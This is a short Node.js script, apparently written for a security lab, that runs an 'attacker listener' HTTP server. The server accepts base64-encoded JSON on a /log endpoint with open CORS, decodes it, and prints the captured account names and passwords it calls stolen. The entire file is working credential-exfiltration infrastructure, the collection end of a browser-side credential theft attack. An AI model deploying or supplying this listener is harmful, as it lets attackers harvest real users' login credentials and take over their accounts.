const http = require('http');
const url = require('url');

const PORT = 9000;

const server = http.createServer((req, res) => {
    // Set headers to allow cross-origin requests from your local lab portal page
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
    
    const parsedUrl = url.parse(req.url, true);
    
    if (parsedUrl.pathname === '/log' && parsedUrl.query.data) {
        try {
            const rawBase64Data = parsedUrl.query.data;
            // Decode the arriving encrypted Base64 string payload back to clear text strings
            const decodedJsonText = Buffer.from(rawBase64Data, 'base64').toString('utf-8');
            const credentials = JSON.parse(decodedJsonText);
            
            console.log(`\n======================================================`);
            console.log(`🚨 [EXFILTRATION RECEIVED FROM USER CLIENT BROWSING SESSION]`);
            console.log(`👤 STOLEN ACCOUNT ID : ${credentials.account}`);
            console.log(`🔑 STOLEN PASSWORD   : ${credentials.secret}`);
            console.log(`🎯 ORIGIN SOURCE SCOPE: ${credentials.captured_at}`);
            console.log(`======================================================`);
        } catch (e) {
            console.log("[-] Received abnormal tracing request connection.");
        }
    }
    
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
});

server.listen(PORT, () => {
    console.log(`\n📡 [ATTACKER LISTENER ENGINE RUNNING] -> Watching port ${PORT} for inbound credentials...`);
});
